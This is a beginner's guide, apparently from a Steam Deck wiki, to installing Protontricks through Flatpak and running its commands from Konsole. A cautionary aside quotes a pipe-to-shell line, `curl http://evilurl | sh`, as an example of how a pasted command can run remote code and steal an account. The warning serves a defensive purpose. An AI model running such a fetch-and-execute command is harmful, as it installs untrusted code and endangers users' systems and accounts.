# Proton Tricks [Medium/Hard]

Protontricks is a tool that allows users to modify the runtime environment used by proton on a game by game basis. It is fundementally "winetricks" under the hood, but uses Steam App IDs for identifying what environment to modify.

Proton tricks is not installed with the steamdeck and will need to be installed and configured.

Usage of protontricks will be done via the command line.

> ## Luna Note: Command Line Usage
>
> Take care when running anything in the commandline of your steamdeck! It is not a stretch to say that a single command could compromise your account. A command like `curl http://evilurl | sh` is all it takes to run random code of the internet. And a malicious actor could use this to install a virus or steal your steam account.
>
> **Always** make sure you know what you are running when copying commands from sites like ProtonDB. While ProtonDB is moderated, it is possible that a bad command could exist in a review for some time.


## Installing Protontricks

1. Go to the power menu and click "switch to desktop"
2. Open the "Discover" store and package manager
3. Search "protontricks" and install it
4. Open a "Konsole" terminal window
5. Run `echo "alias protontricks='flatpak run com.github.Matoking.protontricks'" >> ~/.bashrc`
    - This will let you run protontricks using just the `protontricks` command
6. Close "Konsole", and open a _new_ session of it.
    - This is needed to load the changes we just made
7. Run `protontricks -l`

If the install succeeded, you should see a list of your installed Steam games after running the last command.


## Using Protontricks

As a user, you will most likely find protontricks commands from ProtonDB. This guide will not cover discovering new protontricks commands.

1. Go to the power menu and click "switch to desktop"
2. Open a "Konsole" terminal window
3. Run the protontricks command that you have e.g. `protontricks APPID COMMAND`
4. Return to gaming mode, and run your game

Once the protontricks command is complete, it should be applied to your game.
